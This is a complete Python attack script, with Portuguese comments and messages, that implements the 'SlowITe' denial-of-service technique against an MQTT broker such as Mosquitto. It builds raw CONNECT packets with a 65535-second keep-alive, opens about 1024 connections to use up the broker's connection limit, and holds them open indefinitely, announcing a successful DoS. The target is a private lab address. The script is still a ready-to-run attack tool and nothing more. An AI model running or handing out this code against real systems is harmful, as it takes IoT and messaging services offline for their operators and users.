import socket
import time
import struct

TARGET_IP = "10.0.2.10"
TARGET_PORT = 1883
NUM_CONEXOES = 1024  # Limite padrão do Mosquitto

def build_mqtt_connect_packet(client_id, keep_alive=65535):
    protocol_name = b"MQTT"
    protocol_level = 4  # v3.1.1
    connect_flags = 0x02 # Clean Session
    
    client_id_bytes = client_id.encode('utf-8')
    payload = struct.pack("!H", len(client_id_bytes)) + client_id_bytes
    
    var_header = (
        struct.pack("!H", len(protocol_name)) + protocol_name +
        struct.pack("!B", protocol_level) +
        struct.pack("!B", connect_flags) +
        struct.pack("!H", keep_alive)
    )
    
    remaining_length = len(var_header) + len(payload)
    fixed_header = struct.pack("!B B", 0x10, remaining_length)
    
    return fixed_header + var_header + payload

def executar_slowite():
    sockets = []
    print(f"[*] Alvo: {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] Iniciando ataque SlowITe (Keep-Alive=65535s)...")

    for i in range(NUM_CONEXOES):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((TARGET_IP, TARGET_PORT))
            
            packet = build_mqtt_connect_packet(f"slow_bot_{i}", keep_alive=65535)
            s.sendall(packet)
            
            connack = s.recv(4)
            if connack and connack[0] == 0x20:
                sockets.append(s)
            
            if (i + 1) % 100 == 0:
                print(f"[+] {len(sockets)} conexões SlowITe estabelecidas com sucesso.")
        except Exception:
            print(f"[-] Broker parou de aceitar conexões no índice {i}. DoS alcançado!")
            break
        time.sleep(0.01)

    print(f"\n[✓] DoS Ativo! {len(sockets)} conexões presas no Broker por ~27 horas.")
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        print("\n[*] Encerrando o ataque...")
        for s in sockets:
            s.close()

if __name__ == "__main__":
    executar_slowite()
